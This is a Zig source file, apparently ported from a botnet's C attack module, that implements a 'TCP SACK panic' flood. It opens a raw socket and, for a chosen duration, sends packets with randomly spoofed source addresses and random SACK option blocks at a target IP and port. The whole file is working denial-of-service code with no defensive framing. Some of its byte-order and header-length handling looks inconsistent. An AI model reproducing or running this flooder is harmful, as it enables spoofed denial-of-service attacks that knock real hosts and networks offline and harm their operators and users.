//! # TCP SACK Panic Attack
//!
//! Sends TCP packets with SACK options to force expensive kernel queue scanning.
//!
//! ## C Reference: modules/attack/methods/sack.c (120 lines)

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

const IPPROTO_TCP: u8 = 6;
const IPPROTO_RAW: u8 = 255;

// ============================================================
// IP HEADER
// ============================================================

const IpHeader = packed struct {
    version_ihl: u8,
    tos: u8,
    tot_len: u16,
    id: u16,
    frag_off: u16,
    ttl: u8,
    protocol: u8,
    check: u16,
    saddr: u32,
    daddr: u32,
};

// ============================================================
// TCP HEADER (with extended size for options)
// ============================================================

const TcpHeader = packed struct {
    source: u16,
    dest: u16,
    seq: u32,
    ack_seq: u32,
    doff_flags: u16, // Data offset = 14 words (56 bytes total TCP header)
    window: u16,
    check: u16,
    urg_ptr: u16,
};

// ============================================================
// SACK ATTACK (from C: sack.c attack_tcp_sack lines 25-119)
// ============================================================
// SACK Option:
// - Kind: 5 (SACK)
// - Length: 34 (2 header + 32 data for 4 blocks)
// - Each block: Left edge (4B) + Right edge (4B)

pub fn attackTcpSack(ip: u32, port: u16, duration: u32) void {
    // Create raw socket (from C: lines 26-30)
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_RAW) catch return;
    defer posix.close(sock);

    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    // Packet: IP(20) + TCP(20) + Options(36) = 76 bytes
    const PACKET_SIZE = 76;

    while (std.time.timestamp() < end_time) {
        var packet: [PACKET_SIZE]u8 = undefined;
        @memset(&packet, 0);

        // IP Header (from C: lines 51-59)
        const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
        iph.version_ihl = 0x45;
        iph.tos = 0;
        iph.tot_len = std.mem.nativeToBig(u16, PACKET_SIZE);
        iph.id = std.mem.nativeToBig(u16, @truncate(rng.next()));
        iph.frag_off = 0;
        iph.ttl = 255;
        iph.protocol = IPPROTO_TCP;
        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random spoofed source
        iph.daddr = ip;
        iph.check = 0;
        iph.check = crypto.internetChecksum(packet[0..20]);

        // TCP Header (from C: lines 67-75)
        const tcph = @as(*TcpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
        tcph.source = std.mem.nativeToBig(u16, @truncate(rng.next()));
        tcph.dest = std.mem.nativeToBig(u16, port);
        tcph.seq = rng.next();
        tcph.ack_seq = rng.next();
        // Data offset = 14 words (56 bytes = 20 TCP + 36 options), ACK flag
        tcph.doff_flags = std.mem.nativeToBig(u16, 0xE010); // doff=14, ACK
        tcph.window = std.mem.nativeToBig(u16, 64240);
        tcph.check = 0;
        tcph.urg_ptr = 0;

        // TCP Options (from C: lines 77-98)
        const opts = packet[40..];

        // NOP NOP for alignment (from C: line 80)
        opts[0] = 1;
        opts[1] = 1;

        // SACK Option (Kind=5, Len=34) (from C: lines 83-84)
        opts[2] = 5; // SACK kind
        opts[3] = 34; // Length

        // Generate 4 random SACK blocks (from C: lines 87-98)
        // Block 1
        std.mem.writeInt(u32, opts[4..8], std.mem.nativeToBig(u32, rng.next()), .little);
        std.mem.writeInt(u32, opts[8..12], std.mem.nativeToBig(u32, rng.next()), .little);
        // Block 2
        std.mem.writeInt(u32, opts[12..16], std.mem.nativeToBig(u32, rng.next()), .little);
        std.mem.writeInt(u32, opts[16..20], std.mem.nativeToBig(u32, rng.next()), .little);
        // Block 3
        std.mem.writeInt(u32, opts[20..24], std.mem.nativeToBig(u32, rng.next()), .little);
        std.mem.writeInt(u32, opts[24..28], std.mem.nativeToBig(u32, rng.next()), .little);
        // Block 4
        std.mem.writeInt(u32, opts[28..32], std.mem.nativeToBig(u32, rng.next()), .little);
        std.mem.writeInt(u32, opts[32..36], std.mem.nativeToBig(u32, rng.next()), .little);

        // TCP checksum (from C: lines 100-114)
        tcph.check = calculateTcpChecksum(iph.saddr, ip, packet[20..PACKET_SIZE]);

        // Send (from C: line 116)
        var dest: posix.sockaddr.in = .{
            .family = posix.AF.INET,
            .port = std.mem.nativeToBig(u16, port),
            .addr = ip,
        };

        _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
    }
}

fn calculateTcpChecksum(saddr: u32, daddr: u32, tcp_segment: []const u8) u16 {
    var sum: u32 = 0;

    sum += (saddr >> 16) & 0xFFFF;
    sum += saddr & 0xFFFF;
    sum += (daddr >> 16) & 0xFFFF;
    sum += daddr & 0xFFFF;
    sum += IPPROTO_TCP;
    sum += @as(u16, @intCast(tcp_segment.len));

    var i: usize = 0;
    while (i + 1 < tcp_segment.len) : (i += 2) {
        sum += @as(u16, tcp_segment[i]) << 8 | tcp_segment[i + 1];
    }
    if (i < tcp_segment.len) {
        sum += @as(u16, tcp_segment[i]) << 8;
    }

    while (sum >> 16 != 0) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~@as(u16, @truncate(sum));
}
